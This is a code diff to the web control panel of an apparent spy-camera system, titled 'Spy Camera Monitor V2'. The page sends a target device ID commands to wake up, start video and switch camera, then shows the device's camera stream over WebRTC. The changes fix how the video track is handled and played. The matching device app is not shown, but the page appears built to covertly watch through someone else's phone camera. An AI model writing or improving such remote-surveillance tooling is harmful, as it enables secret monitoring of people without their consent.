@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Camera Monitor V2</title>
+    <title>Spy Camera Monitor V2 (Fixed)</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
     <style>
         /* --- PHONE UI STYLE --- */
@@ -44,7 +44,7 @@
         .video-container {
             flex-grow: 1;
             position: relative;
-            background: #111;
+            background: #000; /* Deep Black Background */
             display: flex;
             align-items: center;
             justify-content: center;
@@ -52,8 +52,9 @@
 
         video {
             width: 100%; height: 100%;
-            object-fit: cover;
+            object-fit: contain; /* Cover ki jagah Contain kiya taaki video kate nahi */
             transform: scaleX(-1); /* Mirror view */
+            background-color: #000;
         }
 
         /* Loading / Status Text */
@@ -197,7 +198,7 @@
                 <div class="spinner"></div>
                 <span style="font-size:12px; color:#aaa;">Waiting for video...</span>
             </div>
-            <video id="remoteVideo" autoplay playsinline muted></video>
+            <video id="remoteVideo" autoplay playsinline muted controls></video>
         </div>
 
         <div class="controls">
@@ -221,58 +222,49 @@
             ]
         };
 
-        // 1. PAGE LOAD: Check agar ID pehle se saved hai
+        // 1. PAGE LOAD
         window.onload = function() {
             const savedId = localStorage.getItem("savedDeviceId");
             if (savedId) {
                 document.getElementById("targetId").value = savedId;
-                // Auto connect mat karo, user ko Connect dabane do taaki wo ready ho
             }
         };
 
-        // 2. CONNECT BUTTON CLICKED
+        // 2. CONNECT BUTTON
         function saveAndConnect() {
             const inputId = document.getElementById("targetId").value.trim();
             if (!inputId) return alert("Enter Device ID!");
 
-            // ID Save karo
             targetDeviceId = inputId;
             localStorage.setItem("savedDeviceId", targetDeviceId);
-
-            // UI Hide karo
             document.getElementById("login-overlay").style.display = 'none';
             
-            // Connection Start karo
             initSocket();
         }
 
-        // 3. RESTART / RECONNECT BUTTON
+        // 3. RESTART FUNCTION
         function restartConnection() {
             console.log("⚡ Restarting Connection...");
             updateStatus("Restarting...", false);
             
-            // Step 1: Sab kuch band karo
+            const video = document.getElementById("remoteVideo");
+            video.srcObject = null; // Clear video
+
             if (peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
             }
             if (socket) {
-                socket.emit('leave', "ADMIN"); // Clean exit (optional)
+                socket.emit('leave', "ADMIN");
             }
 
-            // Step 2: Device ko command bhejo "Video Start Karo"
-            // (Iske liye Android App mein 'command' listener hona chahiye)
             if (socket && socket.connected) {
-                 // Hum 'send-command' use karenge jo server mein already hai
                 socket.emit('send-command', {
                     targetId: targetDeviceId,
-                    command: "start_video" // App ko ye command milna chahiye
+                    command: "start_video"
                 });
-                
-                // Thoda wait karke khud bhi ready ho jao
                 document.getElementById("loader").style.display = 'block';
             } else {
-                // Agar socket hi disconnected tha, to pura init karo
                 initSocket();
             }
         }
@@ -287,7 +279,6 @@
                 updateStatus("Waiting...", false);
                 socket.emit("join-room", "ADMIN");
 
-                // Jaise hi connect ho, Device ko "Wake Up" call bhejo
                 setTimeout(() => {
                     socket.emit('send-command', {
                         targetId: targetDeviceId,
@@ -300,7 +291,7 @@
                 updateStatus("Socket Offline", false);
             });
 
-            // 📡 OFFER RECEIVED (Main Logic)
+            // 📡 OFFER RECEIVED
             socket.on("offer", async (data) => {
                 console.log("📡 Offer Received from Device");
                 document.getElementById("loader").style.display = 'none';
@@ -345,9 +336,30 @@
             if (peerConnection) peerConnection.close();
             peerConnection = new RTCPeerConnection(config);
 
+            // ✅ CRITICAL FIX: Robust Track Handling
             peerConnection.ontrack = (event) => {
+                console.log("🎥 Video Track Received:", event.track.kind);
                 const video = document.getElementById("remoteVideo");
-                video.srcObject = event.streams[0];
+                
+                // Fallback: Agar streams array khali hai to naya stream banao
+                if (event.streams && event.streams[0]) {
+                    video.srcObject = event.streams[0];
+                    console.log("✅ Using event.streams[0]");
+                } else {
+                    if (!video.srcObject) {
+                        video.srcObject = new MediaStream([event.track]);
+                        console.log("✅ Created new MediaStream");
+                    } else {
+                        video.srcObject.addTrack(event.track);
+                    }
+                }
+
+                // 🔥 FORCE PLAY
+                video.play().then(() => {
+                    console.log("▶️ Video Playing");
+                }).catch(e => {
+                    console.error("❌ Auto-play failed (Click play manually)", e);
+                });
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -362,9 +374,12 @@
                 }
             };
             
-            // Agar Connection Fail ho jaye
-            peerConnection.oniceconnectionstatechange = () => {
-                if(peerConnection.iceConnectionState === 'disconnected') {
+            peerConnection.onconnectionstatechange = () => {
+                console.log("Connection State:", peerConnection.connectionState);
+                if(peerConnection.connectionState === 'connected') {
+                     updateStatus("Connected", true);
+                }
+                if(peerConnection.connectionState === 'disconnected') {
                     updateStatus("Disconnected", false);
                     document.getElementById("loader").style.display = 'block';
                 }
@@ -373,7 +388,6 @@
 
         function switchCamera() {
             if(socket) {
-                // Button animation
                 const btn = document.querySelector('.btn-switch');
                 btn.style.transform = "rotate(180deg)";
                 setTimeout(() => btn.style.transform = "rotate(0deg)", 300);
